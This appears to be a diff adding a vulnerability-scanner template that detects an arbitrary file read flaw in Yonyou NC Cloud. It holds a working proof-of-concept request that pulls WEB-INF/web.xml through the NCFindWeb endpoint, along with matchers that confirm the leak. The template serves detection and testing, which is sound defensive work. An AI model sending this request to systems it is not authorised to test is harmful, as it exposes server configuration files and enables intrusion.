@@ -1,0 +1,28 @@
+id: yaml-poc-yonyou-nc-cloud-readfile-ct-158094
+info:
+  name: Yonyou NC Cloud Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects arbitrary file read vulnerability in Yonyou NC Cloud by accessing restricted files like WEB-INF/web.xml.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
+    headers:
+      Accept: application/xml
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/xml"
+      - type: word
+        part: body
+        words:
+          - "<servlet-name>NCInvokerServlet</servlet-name>"
